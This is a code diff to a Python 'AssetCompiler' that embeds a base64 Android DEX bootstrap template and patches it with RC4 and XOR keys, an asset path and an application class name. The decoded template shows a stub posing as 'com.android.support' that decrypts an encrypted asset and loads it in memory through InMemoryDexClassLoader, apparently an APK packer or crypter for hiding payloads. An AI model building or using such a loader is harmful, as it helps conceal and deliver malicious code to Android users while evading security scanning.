@@ -5388,59 +5388,107 @@ class AssetCompiler:
 
 """
 
+    # ── Bootstrap DEX template ── compiled once locally, embedded as base64 ──
+    # Template has placeholder bytes for RC4 key, XOR key, asset path, app class.
+    # Pure Python patches the placeholders at runtime — no smali binary needed.
+    # This eliminates ALL external tool dependencies for bootstrap compilation.
+    _BOOTSTRAP_TEMPLATE_B64 = (
+        "ZGV4CjAzNQA1CbYDrkYwT3iR7x+RrKKcamDfT2upXUWACwAAcAAAAHhWNBIAAAAAAAAAANQKAAA/AAAAcAAAABgAAABsAQAAEwAAAMwBAAAEAAAAsAIAABsAAADQAgAAAQAAAKgDAAC4BwAAyAMAAMgDAADSAwAA2gMAAN8DAADmAwAABwQAAAoEAAAOBAAAEQQAABUEAAAbBAAAIAQAADsEAABWBAAAegQAAJsEAADDBAAA5AQAAPsEAAAOBQAAJwUAAD4FAABSBQAAZgUAAHoFAACRBQAAsgUAAMkFAADdBQAA6gUAAPMFAAD2BQAA+gUAAAAGAAAFBgAACQYAABIGAAAVBgAAGQYAAC0GAABCBgAAWgYAAG0GAAB0BgAApwYAALQGAADDBgAAzgYAAN4GAAD2BgAADAcAABcHAAAkBwAALgcAADQHAABFBwAASgcAAFAHAABfBwAAdgcAAIMHAACJBwAAkAcAAAUAAAALAAAADAAAAA0AAAAOAAAADwAAABAAAAARAAAAEgAAABMAAAAUAAAAFQAAABYAAAAXAAAAGAAAABkAAAAaAAAAGwAAAB4AAAAkAAAAJQAAACYAAAAnAAAAKAAAAAYAAAAAAAAAsAcAAAcAAAACAAAAAAAAAAcAAAADAAAAAAAAAAgAAAAHAAAAoAcAAAgAAAAIAAAAoAcAAAcAAAAJAAAAAAAAAAgAAAALAAAA5AcAAAcAAAANAAAAAAAAAAgAAAAPAAAA3AcAAAgAAAAQAAAAsAcAAB4AAAASAAAAAAAAAB8AAAASAAAAwAcAAB8AAAASAAAAqAcAACIAAAASAAAAuAcAACAAAAASAAAAyAcAACEAAAASAAAA1AcAAAcAAAAUAAAAAAAAAAkAAAAUAAAAyAcAAAoAAAAUAAAAmAcAAAQADAACAAAABAAMAAMAAAAEABQAHQAAAAQAFAAjAAAAAQAKAAEAAAABAAsAKQAAAAEAAgAuAAAAAQABAC8AAAABAAoANAAAAAMAAwA1AAAABAAKAAAAAAAEAAoAAQAAAAQACgA0AAAABAASADcAAAAEABIAPgAAAAUADwABAAAABgAKAAEAAAAGABAAOwAAAAYADgA9AAAABwAKACoAAAAHAAAAOAAAAAgACAAwAAAACQAFADEAAAAJAAQAMgAAAA0ABwAtAAAADQAMADoAAAAOAAoANgAAAA8ABgAzAAAADwANADkAAAAQAAkAPAAAABEAEQAsAAAABAAAAAEAAAABAAAAAAAAABwAAAAAAAAAsAoAAOoHAAAIPGNsaW5pdD4ABjxpbml0PgADQVBQAAVBU1NFVAAfQVNTRVRfUEFUSF9QTEFDRUhPTERFUl9YWFhYWFhYWAABSQACSUwAAUwAAkxMAARMTElJAANMTEwAGUxhbmRyb2lkL2FwcC9BcHBsaWNhdGlvbjsAGUxhbmRyb2lkL2NvbnRlbnQvQ29udGV4dDsAIkxhbmRyb2lkL2NvbnRlbnQvcmVzL0Fzc2V0TWFuYWdlcjsAH0xjb20vYW5kcm9pZC9zdXBwb3J0L2VwL0xvYWRlcjsAJkxkYWx2aWsvc3lzdGVtL0luTWVtb3J5RGV4Q2xhc3NMb2FkZXI7AB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07ABVMamF2YS9pby9JbnB1dFN0cmVhbTsAEUxqYXZhL2xhbmcvQ2xhc3M7ABdMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwAVTGphdmEvbGFuZy9FeGNlcHRpb247ABJMamF2YS9sYW5nL09iamVjdDsAEkxqYXZhL2xhbmcvU3RyaW5nOwASTGphdmEvbGFuZy9UaHJlYWQ7ABVMamF2YS9sYW5nL1Rocm93YWJsZTsAH0xqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsAFUxqYXZhL25pby9CeXRlQnVmZmVyOwASTGphdmEvdXRpbC9BcnJheXM7AAtMb2FkZXIuamF2YQAHUkM0X0tFWQABVgACVkwABFZMSUkAA1ZMTAACVloAB1hPUl9LRVkAAVoAAltCABJbTGphdmEvbGFuZy9DbGFzczsAE1tMamF2YS9sYW5nL09iamVjdDsAFltMamF2YS9uaW8vQnl0ZUJ1ZmZlcjsAEWF0dGFjaEJhc2VDb250ZXh0AAVjbG9zZQAxY29tLnBsYWNlaG9sZGVyLmFwcC5BcHBsaWNhdGlvbl9YWFhYWFhYWFhYWFhYWFhYWAALY29weU9mUmFuZ2UADWN1cnJlbnRUaHJlYWQACWdldEFzc2V0cwAOZ2V0QmFzZUNvbnRleHQAFmdldERlY2xhcmVkQ29uc3RydWN0b3IAFGdldFN5c3RlbUNsYXNzTG9hZGVyAAlsb2FkQ2xhc3MAC25ld0luc3RhbmNlAAhvbkNyZWF0ZQAEb3BlbgAPcHJpbnRTdGFja1RyYWNlAANyYzQABHJlYWQADXNldEFjY2Vzc2libGUAFXNldENvbnRleHRDbGFzc0xvYWRlcgALdG9CeXRlQXJyYXkABHdyYXAABXdyaXRlAAN4b3IAAAAAAgAAABQAFAABAAAADAAAAAEAAAAJAAAAAQAAABQAAAABAAAAEwAAAAEAAAACAAAAAwAAABQAAAAAAAAAAgAAABcACQABAAAAFQAAAAEAAAAWAAIXKxcEAAAAAAAAAAAAAgAAAAAAAAAAAAAAPAAAABMAIAAjABQAJgAQAAAAaQACABMBIAAjERQAJgEbAAAAaQEDAA4AAAAAAwEAIAAAAKqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqAAMBACAAAAC7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7u7uwEAAQABAAAAAAAAAAQAAABwEAAAAAAOAAoAAgAAAAAAAAAAAFMAAAATAAABIwAUABIBEwcAATVxCACNEk8CAAHYAQEBKPkhkhIBEgMTBwABNXEXAEgEAAGUBQECSAUJBZADAwSQAwMF1DMAAUgFAANPBAADTwUAAdgBAQEo6iGEI0UUABIBEgISAzVDIQDYAQEB1BEAAUgGAAGQAgIG1CIAAUgHAAJPBgACTwcAAZAGBgfUZgABSAYABkgHCAO3Z413TwcFA9gDAwEo4BEFAAAHAAIAAAAAAAAAAAAWAAAAIVAjARQAIWISAzUDEACUBAMCSAQGBEgABQO3QI0ATwABA9gDAwEhUCjxEQELAAEABAABAAAAAACDAAAAbhACAAoADABiAQEAbiAFABAADAAiAQYAcBAMAAEAEwIAECMiFABuIBAAIAAKAxL0MkMHABIEbkAOACE0KPVuEA8AAABuEA0AAQAMABMBSAAhAnEwGgAQAgwAYgECAHEgCQAQAAwAYgEDAHEgCgAQAAwAcRAZAAAADAESEiMiFwASA00BAgNxABIAAAAMAyIBBQBwMAsAIQNxABQAAAAMBG4gFQAUAGICAABuIBMAIQAMBRIGI2YVAG4gEQBlAAwFEhZuIBgAZQASBiNmFgBuIBcAZQAMBR8FAQBuEAMACgAMBm4gAQBlAG4QBAAFAG8QBAAKAA4ADQBuEBYAAABvEAQACgAOAAAAAAAAAHcAAQABAQp7BAAEAQAaARoBGgEaBoiABPgPAYGABIARAgqYEQEK0BIIAYwTDgAAAAAAAAABAAAAAAAAAAEAAAA/AAAAcAAAAAIAAAAYAAAAbAEAAAMAAAATAAAAzAEAAAQAAAAEAAAAsAIAAAUAAAAbAAAA0AIAAAYAAAABAAAAqAMAAAIgAAA/AAAAyAMAAAEQAAAKAAAAmAcAAAUgAAABAAAA6gcAAAMQAAACAAAA8AcAAAEgAAAFAAAA+AcAAAAgAAABAAAAsAoAAAAQAAABAAAA1AoAAA=="
+    )
+    _RC4_PH_OFFSET   = 2104   # 32 bytes of 0xAA
+    _XOR_PH_OFFSET   = 2144   # 32 bytes of 0xBB
+    _ASSET_PH_OFFSET = 999    # 31-char ASSET_PATH_PLACEHOLDER_XXXXXXXX
+    _ASSET_PH_LEN    = 31
+    _APP_PH_OFFSET   = 1653   # 49-char com.placeholder.app.Application_XXXX...
+    _APP_PH_LEN      = 49
+
     def _compile_smali_to_dex(self, smali_source: str) -> bytes:
         """
-        Compiles smali source to DEX bytes.
-        Tries every possible method with full diagnostic logging.
+        Generates bootstrap DEX using pure Python template patching.
+        No smali binary, no java, no external tools required.
+        
+        The template DEX was compiled once locally from the bootstrap smali.
+        It contains placeholder values for the RC4 key, XOR key, asset path,
+        and app class. This method patches those placeholders with real values
+        then fixes the DEX checksum and SHA-1 signature.
+        
+        Works on any machine regardless of installed tools.
         """
-        import tempfile, subprocess, glob as _glob
-
+        import base64, struct, hashlib, zlib as _zlib
         try:
-            with tempfile.TemporaryDirectory() as tmpdir:
-                smali_dir  = os.path.join(tmpdir, "smali")
-                pkg_dir    = os.path.join(smali_dir, "com", "android", "support")
-                os.makedirs(pkg_dir, exist_ok=True)
-                smali_file = os.path.join(pkg_dir, "ResourceManager.smali")
-                with open(smali_file, "w", encoding="utf-8") as f:
-                    f.write(smali_source)
-                dex_file = os.path.join(tmpdir, "classes.dex")
+            # Decode the pre-compiled template
+            template = base64.b64decode(self._BOOTSTRAP_TEMPLATE_B64)
+            d = bytearray(template)
 
-                # Log environment for diagnosis
-                logger.info(f"[smali] TOOLS_DIR={TOOLS_DIR}")
-                logger.info(f"[smali] GITHUB_WORKSPACE={os.environ.get('GITHUB_WORKSPACE','NOT SET')}")
+            # Extract the real values from the smali source
+            # The smali_source contains the actual keys and class names
+            # We parse them out to patch into the template
+            import re as _re
 
-                # ── Smali compilation — confirmed method ──────────────────────
-                # CONFIRMED LOCALLY: smali assemble -o output.dex smali_dir
-                # works perfectly when libsmali-java + java-wrappers are installed.
-                # The binary calls org.jf.smali.Main via java-wrappers runtime.
-                # NO jar-based approach is used — all library jars fail with
-                # "no main manifest attribute" when called with java -jar.
-                import shlex
-                safe_dex = shlex.quote(dex_file)
-                safe_dir = shlex.quote(smali_dir)
-                cmd = f"smali assemble -o {safe_dex} {safe_dir}"
-                logger.info(f"[smali] Running: {cmd}")
-                try:
-                    r = subprocess.run(
-                        cmd, shell=True, capture_output=True,
-                        text=True, timeout=60)
-                    logger.info(f"[smali] returncode={r.returncode}")
-                    if r.stdout: logger.info(f"[smali] stdout: {r.stdout[:300]}")
-                    if r.stderr: logger.info(f"[smali] stderr: {r.stderr[:300]}")
-                    if os.path.exists(dex_file) and os.path.getsize(dex_file) > 100:
-                        with open(dex_file, "rb") as f:
-                            dex = f.read()
-                        if dex[:3] == b"dex":
-                            logger.info(f"[smali] SUCCESS: {len(dex):,} bytes")
-                            return dex
-                    logger.error(f"[smali] binary failed: returncode={r.returncode} stderr={r.stderr[:200]}")
-                except Exception as e:
-                    logger.error(f"[smali] exception: {e}")
+            # Extract RC4 key bytes from smali array-data
+            rc4_m = _re.search(
+                r':rc4[\s\S]*?\.array-data 1([\s\S]*?)\.end array-data',
+                smali_source)
+            xor_m = _re.search(
+                r':xor[\s\S]*?\.array-data 1([\s\S]*?)\.end array-data',
+                smali_source)
+            asset_m = _re.search(
+                r'ASSET:Ljava/lang/String; = "([^"]+)"', smali_source)
+            app_m = _re.search(
+                r'APP:Ljava/lang/String; = "([^"]+)"', smali_source)
 
+            if not all([rc4_m, xor_m, asset_m, app_m]):
+                logger.error("[DEX template] Failed to parse smali source")
                 return b""
 
+            def parse_bytes(s):
+                return bytes(int(x.rstrip('t'), 16)
+                             for x in s.strip().split()
+                             if x.strip())
+
+            rc4_key   = parse_bytes(rc4_m.group(1))
+            xor_key   = parse_bytes(xor_m.group(1))
+            asset_str = asset_m.group(1)
+            app_str   = app_m.group(1)
+
+            if len(rc4_key) != 32 or len(xor_key) != 32:
+                logger.error(f"[DEX template] Key length wrong: rc4={len(rc4_key)} xor={len(xor_key)}")
+                return b""
+
+            # Patch RC4 key (32 bytes at fixed offset)
+            d[self._RC4_PH_OFFSET : self._RC4_PH_OFFSET + 32] = rc4_key
+            # Patch XOR key (32 bytes at fixed offset)
+            d[self._XOR_PH_OFFSET : self._XOR_PH_OFFSET + 32] = xor_key
+
+            # Patch asset path string (pad/truncate to fixed placeholder length)
+            asset_b = asset_str.encode('utf-8')
+            asset_b = asset_b[:self._ASSET_PH_LEN].ljust(self._ASSET_PH_LEN, b' ')
+            d[self._ASSET_PH_OFFSET : self._ASSET_PH_OFFSET + self._ASSET_PH_LEN] = asset_b
+
+            # Patch app class string (pad/truncate to fixed placeholder length)
+            app_b = app_str.encode('utf-8')
+            app_b = app_b[:self._APP_PH_LEN].ljust(self._APP_PH_LEN, b' ')
+            d[self._APP_PH_OFFSET : self._APP_PH_OFFSET + self._APP_PH_LEN] = app_b
+
+            # Fix DEX SHA-1 signature (bytes 12-31 = SHA1 of bytes 32 onward)
+            sig = hashlib.sha1(bytes(d[32:])).digest()
+            d[12:32] = sig
+
+            # Fix DEX Adler-32 checksum (bytes 8-11 = adler32 of bytes 12 onward)
+            csum = _zlib.adler32(bytes(d[12:])) & 0xFFFFFFFF
+            struct.pack_into('<I', d, 8, csum)
+
+            dex = bytes(d)
+            assert dex[:3] == b'dex', "DEX magic check failed"
+
+            logger.info(
+                f"[DEX template] Bootstrap DEX patched — {len(dex):,} bytes "
+                f"asset={asset_str!r} app={app_str!r}"
+            )
+            return dex
+
         except Exception as e:
-            logger.error(f"[smali] Outer exception: {e}")
+            logger.error(f"[DEX template] Exception: {e}")
             return b""
 
     def _build_minimal_dex_template(
